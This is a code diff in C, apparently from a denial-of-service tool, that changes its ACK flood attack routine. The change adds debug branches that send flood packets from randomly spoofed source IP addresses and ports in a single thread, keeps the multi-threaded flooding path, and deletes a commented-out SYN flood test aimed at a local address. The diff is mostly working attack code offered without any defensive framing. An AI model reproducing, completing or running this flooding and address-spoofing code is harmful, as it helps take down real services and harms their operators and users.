@@ -118,6 +118,12 @@ static void _attack_thread(pAFTP parameters)
     int dport = parameters->dport;
     int rep = parameters->rep;
 
+#ifdef DEBUG
+    char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
+    saddr = randip(&saddr);
+    int sport = randport();
+   _send_ack_packet(daddr, dport, saddr, sport, rep);
+#else
     if (parameters->random_saddr)
     {
         char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
@@ -139,6 +145,7 @@ static void _attack_thread(pAFTP parameters)
             _send_ack_packet(daddr, dport, saddr, sport, rep);
         }
     }
+#endif
 }
 
 int ack_flood_attack(char *url, int port, ...)
@@ -179,9 +186,11 @@ int ack_flood_attack(char *url, int port, ...)
     parameters->saddr = saddr;
     parameters->sport = sport;
 
+#ifndef DEBUG
     pthread_t tid_list[thread_number];
     pthread_attr_t attr;
     int ret;
+#endif
 
     if (strlen(url))
     {
@@ -195,7 +204,11 @@ int ack_flood_attack(char *url, int port, ...)
         error("please specify a target port");
     }
 
-    for (i = 0; i < thread_number; i++) // only one process
+#ifdef DEBUG
+    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
+    _attack_thread(parameters);
+#else
+    for (i = 0; i < thread_number; i++)
     {
         if (pthread_attr_init(&attr))
         {
@@ -220,19 +233,6 @@ int ack_flood_attack(char *url, int port, ...)
     {
         pthread_join(tid_list[i], NULL);
     }
-
+#endif
     return 0;
 }
-
-/*
-int main(void)
-{
-    // for test
-    pAllAttackParameter p = (pAllAttackParameter)malloc(sizeof(Input));
-    p->random_sip_address = ENABLE_SIP;
-    p->each_ip_repeat = 1024;
-    strcpy(p->address, "192.168.1.1:80");
-    SYNFloodAttack_Thread(p);
-    return 0;
-}
-*/
